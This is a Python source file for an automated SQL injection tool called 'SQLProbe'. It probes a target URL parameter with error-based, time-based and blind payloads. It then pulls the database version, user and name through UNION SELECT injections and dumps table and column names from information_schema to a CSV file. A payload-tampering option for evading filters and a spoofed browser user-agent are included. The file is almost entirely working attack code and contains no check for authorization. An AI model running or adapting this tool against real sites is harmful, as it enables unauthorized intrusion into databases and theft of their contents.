import argparse
import requests
import csv
import urllib.parse
import time
import sys
import os
from urllib.parse import parse_qs, urlparse

def test_error_based(url, param, method='GET', data=None, headers=None):
    """Test for error-based SQL injection."""
    payloads = [
        "' OR 1=1 --",
        "' AND 1=2 --",
        "' ORDER BY 1000 --"
    ]
    for payload in payloads:
        try:
            if method == 'GET':
                test_url = modify_url(url, param, payload)
                response = requests.get(test_url, headers=headers, timeout=5)
            else:
                test_data = modify_data(data, param, payload)
                response = requests.post(url, data=test_data, headers=headers, timeout=5)
            
            if any(error in response.text.lower() for error in ['mysql', 'sql syntax', 'sqlite', 'postgresql']):
                print(f"[+] Error-based SQL injection detected with payload: {payload}")
                return True
        except requests.RequestException as e:
            print(f"[!] Request error: {e}")
    return False

def test_time_based(url, param, method='GET', data=None, headers=None):
    """Test for time-based SQL injection."""
    payloads = [
        "' AND SLEEP(5) --",  # MySQL
        "' AND pg_sleep(5) --"  # PostgreSQL
    ]
    for payload in payloads:
        try:
            start_time = time.time()
            if method == 'GET':
                test_url = modify_url(url, param, payload)
                response = requests.get(test_url, headers=headers, timeout=10)
            else:
                test_data = modify_data(data, param, payload)
                response = requests.post(url, data=test_data, headers=headers, timeout=10)
            
            elapsed = time.time() - start_time
            if elapsed >= 5:
                print(f"[+] Time-based SQL injection detected with payload: {payload}")
                return True
        except requests.RequestException as e:
            print(f"[!] Request error: {e}")
    return False

def test_blind(url, param, method='GET', data=None, headers=None):
    """Test for blind SQL injection."""
    payloads = [
        ("' AND 1=1 --", "' AND 1=2 --"),  # True/False comparison
    ]
    for true_payload, false_payload in payloads:
        try:
            if method == 'GET':
                true_url = modify_url(url, param, true_payload)
                false_url = modify_url(url, param, false_payload)
                true_response = requests.get(true_url, headers=headers, timeout=5)
                false_response = requests.get(false_url, headers=headers, timeout=5)
            else:
                true_data = modify_data(data, param, true_payload)
                false_data = modify_data(data, param, false_payload)
                true_response = requests.post(url, data=true_data, headers=headers, timeout=5)
                false_response = requests.post(url, data=false_data, headers=headers, timeout=5)
            
            if true_response.text != false_response.text:
                print(f"[+] Blind SQL injection detected with payload: {true_payload}")
                return True
        except requests.RequestException as e:
            print(f"[!] Request error: {e}")
    return False

def modify_url(url, param, payload):
    """Modify URL parameter with payload."""
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    query[param] = payload
    new_query = '&'.join([f'{k}={urllib.parse.quote(v[0])}' for k, v in query.items()])
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

def modify_data(data, param, payload):
    """Modify POST data with payload."""
    new_data = data.copy()
    new_data[param] = payload
    return new_data

def extract_db_info(url, param, method='GET', data=None, headers=None):
    """Extract database information (version, user, database)."""
    info = {}
    payloads = {
        'version': ["@@version", "version()"],  # MySQL, PostgreSQL
        'user': ["user()", "current_user"],    # MySQL, PostgreSQL
        'database': ["database()", "current_database()"]  # MySQL, PostgreSQL
    }
    
    for key, variants in payloads.items():
        for payload in variants:
            try:
                test_payload = f"' UNION SELECT {payload} --"
                if method == 'GET':
                    test_url = modify_url(url, param, test_payload)
                    response = requests.get(test_url, headers=headers, timeout=5)
                else:
                    test_data = modify_data(data, param, test_payload)
                    response = requests.post(url, data=test_data, headers=headers, timeout=5)
                
                if response.status_code == 200 and len(response.text) > 0:
                    info[key] = response.text.strip()[:100]  # Simplified extraction
                    print(f"[+] {key.capitalize()}: {info[key]}")
                    break
            except requests.RequestException as e:
                print(f"[!] Error extracting {key}: {e}")
    return info

def dump_tables(url, param, method='GET', data=None, headers=None):
    """Dump table names and columns."""
    results = []
    table_payload = "' UNION SELECT table_name FROM information_schema.tables --"
    try:
        if method == 'GET':
            test_url = modify_url(url, param, table_payload)
            response = requests.get(test_url, headers=headers, timeout=5)
        else:
            test_data = modify_data(data, param, table_payload)
            response = requests.post(url, data=test_data, headers=headers, timeout=5)
        
        tables = extract_text(response.text)  # Simplified parsing
        for table in tables:
            column_payload = f"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}' --"
            try:
                if method == 'GET':
                    col_url = modify_url(url, param, column_payload)
                    col_response = requests.get(col_url, headers=headers, timeout=5)
                else:
                    col_data = modify_data(data, param, column_payload)
                    col_response = requests.post(url, data=col_data, headers=headers, timeout=5)
                
                columns = extract_text(col_response.text)
                results.append({'table': table, 'columns': columns})
                print(f"[+] Table: {table}, Columns: {', '.join(columns)}")
            except requests.RequestException as e:
                print(f"[!] Error dumping columns for {table}: {e}")
    except requests.RequestException as e:
        print(f"[!] Error dumping tables: {e}")
    return results

def extract_text(text):
    """Simplified text extraction (assumes results are in response body)."""
    return [line.strip() for line in text.split('\n') if line.strip() and len(line) < 100][:10]

def save_results(results, output_file):
    """Save results to CSV."""
    try:
        with open(output_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=['table', 'columns'])
            writer.writeheader()
            for result in results:
                writer.writerow({'table': result['table'], 'columns': ', '.join(result['columns'])})
        print(f"[*] Results saved to {output_file}")
    except Exception as e:
        print(f"[!] Error saving results: {e}")

def tamper_payload(payload):
    """Basic tamper: replace spaces with comments."""
    return payload.replace(' ', '/**/')

def main():
    parser = argparse.ArgumentParser(description="SQLProbe: Automated SQL Injection Testing Tool")
    parser.add_argument('-u', '--url', required=True, help="Target URL (e.g., http://example.com/page?id=1)")
    parser.add_argument('-p', '--param', required=True, help="Parameter to test (e.g., id)")
    parser.add_argument('-m', '--method', choices=['GET', 'POST'], default='GET', help="HTTP method (default: GET)")
    parser.add_argument('-d', '--data', help="POST data (e.g., 'username=admin&password=test')")
    parser.add_argument('-o', '--output', default='sqlprobe_results.csv', help="Output CSV file")
    parser.add_argument('--tamper', action='store_true', help="Apply tamper scripts (e.g., space-to-comment)")
    args = parser.parse_args()

    # Parse POST data
    data = {}
    if args.method == 'POST' and args.data:
        for pair in args.data.split('&'):
            k, v = pair.split('=', 1)
            data[k] = v

    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

    print("[*] Starting SQL injection tests...")
    vulnerable = False

    # Apply tamper if requested
    tamper = tamper_payload if args.tamper else lambda x: x

    # Test for SQL injection
    if test_error_based(args.url, args.param, args.method, data, headers):
        vulnerable = True
    elif test_time_based(args.url, args.param, args.method, data, headers):
        vulnerable = True
    elif test_blind(args.url, args.param, args.method, data, headers):
        vulnerable = True

    if not vulnerable:
        print("[!] No SQL injection vulnerabilities detected.")
        sys.exit(0)

    # Extract database information
    db_info = extract_db_info(args.url, args.param, args.method, data, headers)

    # Dump tables and columns
    results = dump_tables(args.url, args.param, args.method, data, headers)

    # Save results
    if results:
        save_results(results, args.output)

if __name__ == "__main__":
    main()